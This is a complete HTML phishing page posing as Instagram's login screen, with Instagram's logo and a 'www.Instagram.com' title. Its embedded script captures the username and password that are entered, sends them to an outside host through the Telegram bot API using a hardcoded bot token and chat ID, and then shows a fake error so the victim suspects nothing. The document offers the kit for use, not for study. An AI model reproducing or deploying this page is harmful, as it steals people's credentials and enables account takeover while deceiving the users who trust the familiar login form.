<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>www.Instagram.com</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 350px;
      padding: 20px;
    }
    .box {
      background-color: #fff;
      border: 1px solid #e6e6e6;
      border-radius: 4px;
      padding: 40px 30px;
      margin-bottom: 10px;
      text-align: center;
    }
    .heading {
      background-image: url("https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png");
      background-size: contain;
      background-repeat: no-repeat;
      background-position: bottom center;
      height: 50px;
      margin: 20px auto 30px;
    }
    .field {
      position: relative;
      margin-bottom: 20px;
      width: 100%;
    }
    input {
      width: 100%;
      padding: 12px 10px;
      font-size: 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      outline: none;
    }
    label {
      position: absolute;
      top: 12px;
      left: 12px;
      font-size: 14px;
      color: #999;
      pointer-events: none;
      transition: all 0.2s ease;
      background: #fff;
      padding: 0 4px;
    }
    input:focus + label,
    input:not(:placeholder-shown) + label {
      top: -8px;
      font-size: 11px;
      color: #555;
    }
    .login-button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    .separator {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #999;
    }
    .separator .line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }
    .separator p {
      margin: 0 10px;
      font-size: 12px;
      font-weight: bold;
    }
    .other {
      margin-top: 10px;
    }
    .fb-login-btn {
      background: none;
      border: none;
      color: #385185;
      font-weight: bold;
      margin-bottom: 10px;
      cursor: pointer;
    }
    .forgot-password {
      font-size: 12px;
      color: #003569;
      text-decoration: none;
    }
    .signup-box {
      background-color: #fff;
      border: 1px solid #e6e6e6;
      border-radius: 4px;
      padding: 20px;
      text-align: center;
    }
    .signup-box a {
      color: #3897f0;
      font-weight: bold;
      text-decoration: none;
    }
    @media (max-width: 400px) {
      .box, .signup-box {
        padding: 30px 15px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="box">
      <div class="heading"></div>
      <form id="loginForm">
        <div class="field">
          <input id="username" type="text" name="username_or_email" required placeholder=" " aria-label="Username">
          <label for="username">Phone number, username, or email</label>
        </div>
        <div class="field">
          <input id="password" type="password" name="password" required placeholder=" " aria-label="Password">
          <label for="password">Password</label>
        </div>
        <button class="login-button" type="submit">Log In</button>
      </form>
      <div class="separator">
        <div class="line"></div>
        <p>OR</p>
        <div class="line"></div>
      </div>
      <div class="other">
        <button class="fb-login-btn" type="button">Log in with Facebook</button><br>
        <a class="forgot-password" href="#">Forgot password?</a>
      </div>
    </div>

    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

  <!-- Telegram Bot Integration -->
  <script>
    const botToken = '7602654040:AAG8DlUZlku4MrfhYGzPJTA7wbObVzx8R38';
    const chatId = '6810125590';

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();

      if (username.length < 3 || password.length < 4) {
        alert("Invalid credentials.");
        return;
      }

      const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        setTimeout(() => {
          alert("Sorry, an error occurred. Please try again later.");
        }, 1000);
        // Optional: redirect user to Instagram real site
        // window.location.href = "https://www.instagram.com/";
      })
      .catch(error => {
        console.error('Error:', error);
      });
    });
  </script>

</body>
</html>
